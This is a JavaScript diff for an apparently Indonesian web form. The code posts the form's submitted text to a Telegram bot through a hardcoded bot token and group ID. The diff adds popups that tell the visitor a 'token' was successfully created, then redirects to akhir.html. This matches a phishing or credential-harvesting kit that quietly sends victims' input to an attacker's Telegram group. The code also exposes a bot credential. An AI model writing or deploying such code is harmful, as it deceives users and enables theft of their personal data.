@@ -1,9 +1,28 @@
+
+
 const token = '8175304203:AAH8R3p_vyCAcTJudSTASPsWVkwtE6XteYE'
 const group_Id = '-4618790679'
 
 const formtelegram = document.getElementById('formTele')
 
+
 const sendMessage = (text) => {
+    Swal.fire({
+        title: "Sedang Proses...",
+        text: "Mohon Menunggu Sebentar"
+      })
+
+      Swal.showLoading()
+
+      setTimeout((myGreeting) => {
+
+        Swal.fire(
+          'Berhasil!!',
+          'Token Berhasil Dibuat',
+          'success',
+          
+      )          
+      }, 3000);
 
     fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
         method: "POST",
@@ -22,15 +41,17 @@ const sendMessage = (text) => {
         return res.json();
     }).then(res => {
         console.log(res);
-        alert('Berhasil');
-        
     document.getElementById('kirims').innerHTML = "Selanjutnya";
-    window.location.href='akhir.html'
+    setTimeout(function() {
+        window.location.href = "akhir.html";
+      }, 3000); // 5000 milidetik (5 detik)
+ 
     }).catch(err => {
         console.log(err);
         alert('gagal')
     })
-}
+    
+};
 
 formtelegram.onsubmit = (e) => {
     e.preventDefault();        
